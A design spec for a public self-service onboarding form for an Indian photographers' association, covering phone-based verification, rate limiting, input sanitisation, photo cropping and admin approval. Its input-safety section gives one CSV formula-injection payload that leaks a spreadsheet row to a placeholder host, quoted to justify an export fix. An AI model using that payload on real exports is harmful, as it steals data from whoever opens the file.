# Member Self-Service Onboarding — Design Spec

**Date:** 2026-07-27
**Status:** Locked — in build
**Related:** [MDPVA Members App design](./2026-07-25-mdpva-members-app-design.md)

### Locked decisions

| Question | Decision |
|---|---|
| Phone unique index (§3.4) | **Dropped.** Duplicate phones become an admin-visible warning, not a constraint. |
| Kannada (§11.2) | **Required.** Bilingual inline — English label + Kannada subtitle on every public screen. Admin app stays English. |
| Layout | **Locked** to the reviewed mockup: desktop split view, live paper-form preview left, web form right. |
| Consent (§11.3) | **Included** — declaration text on the sheet, checkbox on the form. |
| Approval notification (§11.4) | **None.** Status page only; MDPVA has no messaging channel. |
| Post-onboarding (§11.5) | **Stays open permanently** as the member self-update channel. |

---

## 1. Purpose

MDPVA's member records exist on paper (a ledger of ~1400 members, IDs 1–1400).
Office staff have already scanned part of it into a digital list carrying
**ledger ID, name, phone** for roughly 1250–1300 of them; 100–150 remain
un-scanned. None of the records have photos, and most have no address, email,
profession, or date of birth.

This feature lets members fill in their own details and upload their own
passport photo, without giving them any access to the members app, and without
requiring MDPVA to run an email or SMS system.

**Non-goal:** this is not member login. Members never get an account, a
password, or a session. They get a public form gated by two facts they already
know.

---

## 2. Why not Google Forms for photos

Google Forms supports file-upload questions and can restrict to images and cap
file size, but it cannot:

- enforce dimensions or aspect ratio (no passport crop),
- resize or re-encode (a 12 MP phone photo lands as a 12 MP phone photo),
- name the uploaded file in a way that maps back to a member,
- let the same member replace their photo later.

The result would be a Drive folder of `IMG_2034.jpg` files to hand-match against
spreadsheet rows, once, with no path for future updates. The app already owns a
photo pipeline (magic-byte sniffing, `sharp` re-encode, R2 storage) — reusing it
costs less than building the manual reconciliation process, and it keeps working
after onboarding ends.

**Decision:** Google Form + CSV import stays as an option for *text-only* bulk
entry where a human wants to eyeball rows first (the existing CSV dry-run
already covers that). Photos and member-driven corrections go through this
feature.

---

## 3. Identity model

### 3.1 What members are asked for

Two facts, both already in the member's possession:

| Field | Source | Why |
|---|---|---|
| **Ledger ID** (1–1400) | Printed on their 25-year-old MDPVA card | Identifies the record |
| **Phone number** | Their own phone | Proves it's them |

Ledger ID alone is not enough — the range is small and fully enumerable, so a
script could walk `1..1400` and submit garbage for every member. The phone
number is the actual secret; the ledger ID is the lookup key.

### 3.2 Why not expiring tokens

An earlier option was per-member signed links, mailed out and regenerated on
expiry. Rejected: the rollout window is ~a month, MDPVA has no outbound
messaging channel, and 1400 links that expire mid-window creates exactly the
"my link stopped working, call the office" churn this is meant to avoid. A
standing URL plus a knowledge pair has no link-rot and no admin reissue work.

### 3.3 ⚠️ Gap: ledger ID is `legacy_id`, not `member_id`

The schema has two identifiers:

- `members.legacy_id` — the old printed-card number. **This is the 1–1400 the
  members actually know.**
- `members.member_id` — app-generated `MDPVA-YYYY-NNNN`, created at import time.
  Members have never seen this.

**Verification must match on `legacy_id`.** Naming the form field "Member ID"
would be ambiguous internally; the UI should say **"Membership number (from your
MDPVA card)"** and the code should read `legacy_id` throughout.

Consequence for the bulk import that precedes this: the scanned ledger CSV must
populate `legacy_id` with the ledger number, or verification cannot work.

### 3.4 ⚠️ Gap: phone is uniquely indexed

`members_phone_active` is a unique partial index on `phone` for non-deleted
rows. Two members cannot currently share a phone number.

This will break on real data — a father and son running one studio, or two
members sharing a shop landline, is normal in this trade. It breaks in two
places: the bulk ledger import (second row rejected), and this form (a member
submitting a phone another member already has).

**Decision needed before build.** Options:

- **(a) Drop the unique index on phone**, keep it on email/legacy_id. Duplicate
  phones become an admin-visible warning (the existing `checkDuplicates` already
  surfaces this at edit time) rather than a hard constraint. *Recommended* —
  matches reality, and phone is not being used as a primary key anywhere.
- (b) Keep uniqueness, require members sharing a phone to supply distinct
  contact numbers. Pushes a data-modelling problem onto members. Not
  recommended.

If (a) is chosen: verification then matches on `legacy_id` **and** phone
together, so a shared phone still resolves to exactly one record. No ambiguity.

### 3.5 Phone normalization

Scanned ledger data will contain `9876543210`, `+91 98765 43210`,
`098765-43210`, and worse. Both sides of the comparison must be normalized to
the last 10 digits before matching:

```
normalizePhone(raw) = strip non-digits → drop leading 91/0 → keep last 10
```

Match on normalized form. Store the normalized form on the member record at
import time so the comparison is an indexed equality check, not a per-row
computation.

### 3.6 Members not in the scanned list

The 100–150 un-scanned members cannot verify — there is no row to match. They
are handled **outside this feature**: they visit the office, staff create the
record manually in the admin UI (which also sets `legacy_id`), and from that
point the member can use the form normally.

The form's failure message must not dead-end them:

> We couldn't find that membership number and phone together. If your details
> aren't in our records yet, please contact the MDPVA office.

Deliberately **not** offered: a "I'm not in the list, let me self-register"
path. That would accept unverified strangers into the member database, which is
precisely what the identity gate exists to prevent.

### 3.7 Members whose scanned row has no phone

Some scanned rows will have a ledger ID and name but a blank phone. These
cannot be verified either and fall into the same bucket as §3.6 — office visit,
staff fill in the phone, member proceeds. The admin dashboard should surface a
count of members missing a phone so staff know the size of this group.

---

## 4. Abuse resistance

Threat model: the form URL is public and will be shared in WhatsApp groups. The
question is not "can we keep the URL secret" (we can't) but "what can someone do
with it who isn't the member."

| Control | What it stops |
|---|---|
| **Ledger ID + phone pair** | Enumeration of `1..1400`. Guessing a 10-digit phone is infeasible at any practical rate. |
| **Rate limiting** (per ledger ID, per IP) | Brute-forcing the phone for a known ledger ID. Reuses the existing sliding-window pattern from `rate-limit.ts`. |
| **Nothing is written until an admin approves** | A successful impersonation still can't change the live record. This is the load-bearing control. |
| **Status lookup reveals no data** | The form can't be used to harvest member details (see §7). |
| **Attempt log** | A hammered ledger ID is visible; staff can spot and act on it. |

### 4.1 Deliberately excluded: knowledge-factor challenge

An earlier draft added a second question (DOB, blood group) after the phone.
Dropped: the whole point of this project is that MDPVA *doesn't have* that data
yet — there's nothing to check against, and any question drawn from the paper
ledger would fail for real members more often than it would stop fakes.

### 4.2 Deliberately excluded: identity verification by admins

Admin review is **not** "is this really the member." An admin cannot determine
that from a photo of a stranger they've never met. Review is a sanity check —
is this a real headshot rather than a meme, a blank image, a screenshot, or
obviously someone else's ID card. That's a two-second glance per submission, not
investigative work, and it's what keeps admin cost proportional for 1400 members.

### 4.3 Optional: bot challenge

If automated submission becomes a problem, Cloudflare Turnstile drops in cleanly
(the site is already on Cloudflare) on the verify step only. Not included in v1
— the rate limit plus the phone requirement should be sufficient, and an
unnecessary challenge hurts the many low-digital-literacy members this form is
aimed at.

---

## 4A. Input safety

Everything below applies to **every** text field, on the public form and the
admin form alike — two of these gaps exist in the current code and are fixed as
part of this work.

### 4A.1 Character-level abuse

Member-supplied names land in the directory, in CSV exports, and on printed
cards. Untreated Unicode is the attack surface.

`sanitizeText()` runs on every string before validation:

| Treatment | Why |
|---|---|
| **NFC normalization** | Collapses decomposed forms so `é` and `é` compare equal — otherwise duplicate detection is trivially bypassed. |
| **Strip C0/C1 control characters** | Null bytes, `\r`, escape sequences. |
| **Strip zero-width characters** (`U+200B–200D`, `U+FEFF`) | Invisible padding used to create visually-identical duplicate records. |
| **Strip bidi overrides** (`U+202A–202E`, `U+2066–2069`) | `RLO` reverses displayed text — a classic way to make a name render as something else entirely in the admin list. |
| **Cap combining marks** at 2 per base character | Blocks "Zalgo" text that visually overflows and breaks table rows. |
| **Collapse internal whitespace** to single spaces, trim ends | Prevents `"A" + 4000 spaces + "B"` layout abuse. |
| **Cap by grapheme count, not code units** | An emoji ZWJ sequence is one grapheme but many code units; the limit must reflect what a human sees. |

### 4A.2 Length caps ⚠️ (gap in current code)

`memberInputSchema` currently has **no `.max()` on any field** — a 10 MB name is
accepted today. Caps added, applied to both forms:

| Field | Max (graphemes) |
|---|---|
| First / last name | 60 each |
| Email | 254 (RFC limit) |
| Business name | 120 |
| Address line 1 / 2 | 120 each |
| Area / city / state | 60 each |
| Blood group | 4 |
| Notes (admin only) | 2000 |

### 4A.3 Allowed characters in names

Names must accept Latin **and** Kannada script, plus the punctuation Indian
names genuinely use — while refusing everything else:

```
letters (any script) · combining marks · space · . · ' · - · /
```

`/` is included because business names commonly carry it (`Aarav Photo / Video`).
Digits and symbols are rejected in person names, allowed in business names.

### 4A.4 CSV formula injection ⚠️ (gap in current code)

`Papa.unparse` does not escape formulas. A member named
`=HYPERLINK("http://evil.test?"&A1,"Click")` executes when an admin opens the
export in Excel — exfiltrating the row it's embedded in. This is live today via
the admin form; self-service submission makes it trivially reachable.

**Fix:** prefix any exported cell beginning with `=`, `+`, `-`, `@`, tab or CR
with a single quote, in the export path only (never in stored data).

### 4A.5 Phone handling

```
normalizePhone(raw):
  strip everything except digits
  drop a leading 91 (country code) if the result is then 10 digits
  drop a leading 0 if the result is then 10 digits
  → must be exactly 10 digits, first digit 6–9 (Indian mobile range)
```

Stored normalized on the member row as `normalized_phone` (indexed) so
verification is an indexed equality check. Rejected: fewer/more than 10 digits,
leading 0–5, all-identical digits (`9999999999`), and simple sequences —
these are placeholder junk in the scanned ledger, not real numbers, and
accepting them would let anyone verify as that member.

**Display** stays as the member typed it; only the comparison uses the
normalized form.

### 4A.6 Rate limiting

Reuses the sliding-window pattern from `rate-limit.ts`, against
`application_attempts`:

| Bucket | Limit | Window |
|---|---|---|
| Per membership number | 5 failures | 15 min |
| Per IP | 30 failures | 15 min |

Failure copy is generic and identical for "no such number" and "wrong phone" —
otherwise the form confirms which membership numbers exist.

### 4A.7 Upload safety

Unchanged from the existing pipeline and already correct: magic-byte sniffing
(never trusts `Content-Type`), `sharp` decode with `failOn: "error"`, EXIF
applied then stripped, re-encode to WebP. Adds an 8 MB request cap and a
per-session upload count limit so the endpoint can't be used as free storage.

---

## 5. Member-facing flow

### 5.1 Step 1 — Verify

A single card: membership number + phone. On success the server returns the
member's **name only** (no address, no email, no fees) so the member can confirm
they're editing the right record:

> Found: **Aarav Sharma** — is this you? [Yes, continue] [No, go back]

Showing the name is a small disclosure to someone who already supplied a correct
ID+phone pair — i.e. someone who has already proven substantial knowledge. It's
necessary: without it, a member who mistypes their ledger number silently
overwrites a stranger's record.

Verification issues a short-lived, HTTP-only **session cookie scoped to that
member row** (~2 hours, sliding). This is not a login — it grants exactly one
capability: submit/resubmit an application for that one member. It never grants
read access to the member record beyond the name already shown.

### 5.2 Step 2 — Fill

**Desktop (≥1024px): split view.**

- **Left — live preview.** A rendered member card exactly as it will appear in
  the directory: photo, name, membership number, profession, phone, city. It
  updates as they type. This is the "modern" affordance the design calls for and
  it doubles as validation feedback — people catch their own typos when they see
  the result.
- **Right — the form**, grouped into the same sections the admin form uses
  (Identity, Contact, Address, Profession) so both sides of the app stay
  consistent.

**Mobile (<1024px): single column form**, with a sticky **"Preview"** button in
the footer that opens the same card in a full-screen sheet. Same component, same
data, different container — no second implementation.

**Fields collected** (mirrors `members` schema; nothing here is new to the DB):

| Field | Required | Notes |
|---|---|---|
| First name, Last name | ✅ | Pre-filled from ledger, editable (spelling corrections) |
| Phone | ✅ | Pre-filled from the verified phone, editable |
| Email | — | |
| Profession | ✅ | photographer / videographer / both |
| Business name | — | |
| Address line 1, City, State | ✅ | Matches the NOT NULL columns |
| Address line 2, Area, Pincode | — | Pincode validated `^[0-9]{6}$` |
| Date of birth | — | |
| Blood group | — | Genuinely useful for an association; worth asking |
| Photo | ✅ | See §6 |

**Not collected from members:** `status`, `fees_paid_upto`,
`death_fund_covered`, `notes`, `legacy_id`, `member_id`. These are
association-controlled and must never be member-editable.

### 5.2A Date of birth

A native `<input type="date">` is the wrong control here. It opens on the
current month, and a member born in 1965 would need ~700 taps of "previous
month" to reach their birth date. Browser rendering is also wildly inconsistent
across the older Android devices this audience uses.

**Built instead:** a date field with a popover calendar whose header carries
**month and year dropdowns**. The year list spans 100 years, newest first, so
reaching 1965 is two taps. Typing directly into the field also works
(`DD-MM-YYYY`), for members who find that faster.

- Display format is `DD-MM-YYYY` throughout — the Indian convention. Stored as
  ISO `YYYY-MM-DD` in the `date` column.
- Validated: a real calendar date, not in the future, and between 18 and 100
  years ago. A 2019 birth date in a professional association's records is a
  typo, and catching it at entry costs nothing.
- Optional field — members who don't wish to give it can leave it blank.
- Built on the existing `@base-ui/react/popover`; no new dependency.

### 5.3 Draft caching

Members will fill this on patchy mobile connections over a month. Text fields
autosave to `localStorage` keyed by member row id, restored on return.

Constraints:

- **The photo is not cached.** A base64 image in `localStorage` is both too
  large and the most sensitive thing in the payload. If the tab is closed, the
  photo must be re-picked. Text fields — the tedious part — survive.
- Drafts are cleared on successful submission and on explicit "Start over."
- **⚠️ Shared-device risk:** this is personal data left in a browser on what may
  be a shared phone or a cyber-café machine. Mitigation: the draft holds no
  photo, is namespaced per member, is cleared on submit, and the page carries a
  visible "Clear saved draft" control. Accepted risk, documented.

### 5.4 Step 3 — Submit

On submit the member sees an **application number** (see §7.1) with a clear
instruction to note it down, plus a statement that the details will appear after
office approval.

---

## 6. Photo handling

### 6.1 Answering the sizing question

**100 KB is generously sufficient.** A passport-ratio WebP at the dimensions
below typically lands at **25–60 KB**. Budget 150 KB as a hard ceiling on the
*stored* file and it will never be hit in practice.

**Dimensions.** Passport standard is 35×45 mm — a **7:9 aspect ratio**. Store at
**600×771** (7:9, ~2× the 300 dpi print size). That's sharp on a retina display,
crisp enough to print on a membership card, and small enough to be free.

**Upload limit.** Accept up to 8 MB in (unchanged from
`MAX_UPLOAD_BYTES` — modern phone photos are 3–6 MB and rejecting them at the
door is a support burden). The server crops and re-encodes down; the input size
is irrelevant to what's stored.

### 6.2 Crop tool — yes, and it's necessary

A raw phone photo is 4:3 or 3:4 and will not be a passport photo. Without a crop
step, every submission needs manual cropping by an admin — 1400 times.

**Client:** `react-easy-crop` (~15 KB gzipped, touch and pinch-zoom out of the
box, no CDN dependency) locked to a fixed 7:9 aspect. Member drags and pinches
to frame their face inside a fixed passport-shaped window. Output is a cropped
blob from a canvas.

**Server: re-crop and re-encode regardless.** The client crop is a *convenience*,
never a trust boundary — a crafted request can post anything. A new
`processPassportPhoto()` alongside the existing `processPhoto()`:

```
sniffImageType()                    // existing magic-byte check, unchanged
sharp(buf, { failOn: "error" })
  .rotate()                         // apply EXIF orientation, then strip
  .resize(600, 771, { fit: "cover", position: "attention" })
  .webp({ quality: 80 })
```

`fit: "cover"` guarantees exact 7:9 output whatever arrives.
`position: "attention"` makes the fallback crop (for a client that sent an
uncropped image) centre on the most salient region rather than the geometric
middle — meaningfully better for faces.

### 6.3 Storage lifecycle

Pending photos must never sit in the live photo namespace, or an unapproved
photo could be served as if it were current.

- Pending: `pending/{applicationId}.webp`
- Live: existing per-member key (unchanged)

On **approve**, the pending object is copied to the member's live key and the
pending object deleted. On **reject** or **supersede**, the pending object is
deleted. A scheduled cleanup removes orphaned `pending/` objects older than 90
days.

Serving pending photos to admins reuses the existing auth-gated
`/api/photos/[...key]` route — the pending prefix is admin-only.

---

## 7. Status lookup

Same two facts (membership number + phone) open a **read-only status view**.

Per the explicit design decision: **it displays no member data.** Not the name,
not the submitted values. Only:

- Application number
- Status: `pending` / `approved` / `rejected` / `superseded`
- Submitted date, reviewed date
- **Rejection reason**, when rejected — without this, a rejected member has no
  idea what to fix

This is why it can share the same weak-ish gate as the form: even a successful
guess yields nothing worth harvesting.

### 7.1 Application number

Must not be the ledger ID, the member ID, or sequential — a sequential number
would leak how many members have enrolled and would itself be enumerable.

Format: `APP-XXXXXX` where `XXXXXX` is 6 characters from an unambiguous alphabet
(Crockford base32 — no `I`, `L`, `O`, `U`), from a CSPRNG, unique-indexed. Short
enough to write on paper or read over a phone call, ~1 billion possibilities.

### 7.2 Corrections

Because nothing is written until approval, **the correction path is simply
resubmission** — the member re-verifies and submits again. The new application
supersedes the prior pending one (status `superseded`), which is why that status
exists.

After approval, the same URL still works — verification is a standing capability,
not a one-shot token. A member correcting their phone number six months later
uses the identical flow, and it lands in the same review queue. This is the
mechanism that replaces the outbound-messaging system MDPVA doesn't have.

---

## 8. Admin experience

A new **Onboarding** section in the sidebar (admin-only), separate from Members.

### 8.1 Review queue

List of applications, default-filtered to `pending`, sorted oldest first.
Columns: application number, member name, ledger ID, submitted date, a photo
thumbnail. Reuses the existing table, pagination, filter and bulk-selection
components from the members directory — including the bulk toolbar pattern.

### 8.2 Review detail

Split view, matching the member-facing form so the two feel like one system:

- **Left:** the submitted photo, large enough to actually judge (this is the
  main thing being reviewed), with the current live photo beside it when one
  exists.
- **Right:** a **field-by-field diff** — current ledger value vs submitted
  value, with changes highlighted. Most fields will be "(empty) → value" during
  onboarding, so the diff mainly matters for later corrections.

Actions: **Approve**, **Approve with edits** (admin fixes a typo inline before
accepting — expected to be common with hand-written ledger spellings),
**Reject with reason** (free text, surfaced on the status page).

### 8.3 Bulk approve

For the onboarding push, a "select many → approve" action on visually-verified
rows. Photo thumbnails in the list view are what makes bulk approval safe — the
admin has already seen every photo they're approving.

### 8.4 Progress reporting

A dashboard card for the onboarding period: submitted / approved / pending /
not-yet-started against the 1400 total, plus a count of members missing a phone
(§3.7). Staff need to know who to chase, and when the effort is done.

### 8.5 Approval mechanics

Approval is a single transaction: write the member fields, promote the photo,
mark the application `approved`, stamp `reviewed_by` and `reviewed_at`.

**Concurrency:** two admins opening the same application must not both approve
it. The approve action asserts the application is still `pending` in its `WHERE`
clause and reports "already reviewed" if zero rows update — the same pattern
`softDeleteMember` already uses.

---

## 9. Data model

One new table. No changes to `members` beyond §3.4's index decision and a
normalized-phone column.

```
member_applications
  id                uuid pk
  application_no    text unique          -- APP-XXXXXX
  member_id         uuid → members.id    -- the row being claimed
  status            enum(pending, approved, rejected, superseded)
  -- submitted values (all nullable; validated on submit, not by the DB)
  first_name, last_name, email, phone, profession, business_name,
  address_line1, address_line2, area, city, state, pincode, dob, blood_group
  photo_key         text                 -- pending/{id}.webp
  rejection_reason  text
  reviewed_by       uuid → users.id
  reviewed_at       timestamptz
  created_at        timestamptz
  updated_at        timestamptz

  index on (member_id, status)
  partial unique index on (member_id) where status = 'pending'
     -- at most one live pending application per member
```

```
application_attempts        -- mirrors login_attempts, same rate-limit pattern
  id, legacy_id, ip, success, created_at
  index (legacy_id, created_at), index (ip, created_at)
```

---

## 10. Routes and integration

| Route | Access | Purpose |
|---|---|---|
| `/onboard` | **Public** | Verify step |
| `/onboard/form` | Verify cookie | The form |
| `/onboard/status` | **Public** | Status lookup |
| `/admin/applications` | Admin | Review queue |
| `/admin/applications/[id]` | Admin | Review detail |

**⚠️ Integration hazard:** `src/proxy.ts` redirects every unauthenticated
request to `/login`. The public onboarding routes **must** be added to the
matcher's exclusion list, exactly as `icon.svg` had to be. This has already
bitten this codebase once; it will silently break the entire feature if missed.

---

## 11. Open questions

1. **Phone uniqueness (§3.4)** — drop the unique index, or keep it? Blocks
   both this feature and the bulk ledger import. *Recommendation: drop it.*
2. **Language** — is a Kannada UI needed for the form? MDPVA's membership is
   Mysuru-local and many members are not comfortable in English. This changes
   the build materially (i18n scaffolding vs hard-coded strings) and is much
   cheaper decided now than retrofitted. Only the ~6 public onboarding screens
   would need it; the admin app can stay English.
3. **Consent** — should the form carry an explicit "I agree MDPVA may store and
   display these details in the member directory" checkbox, and a short data-use
   note? Recommended: yes; it's one checkbox and it's the correct posture for
   collecting photos and DOBs.
4. **Does approval notify anyone?** With no messaging channel, no. Members find
   out via the status page. Worth confirming that's acceptable, or whether
   WhatsApp-link-based manual notification by staff is expected.
5. **Post-onboarding lifecycle** — does `/onboard` stay open permanently as the
   member self-update channel (recommended, it's the same code), or get closed
   once the ledger migration completes?

---

## 12. Out of scope

- Member login, sessions, or any read access to the directory
- Fees payment or renewal
- Automated identity verification
- Outbound email/SMS/WhatsApp
- Self-registration by non-members (§3.6)

---

## 13. Suggested build order

1. Phone-uniqueness decision + `normalized_phone` column + backfill
2. `member_applications` schema + verify/rate-limit logic (pure, unit-tested)
3. Public verify step + scoped cookie
4. `processPassportPhoto()` + pending R2 lifecycle
5. Form: shared preview card component, desktop split view, mobile sheet
6. Crop UI
7. Draft caching
8. Admin queue + review detail + approve/reject
9. Bulk approve + progress dashboard card
10. Status lookup page
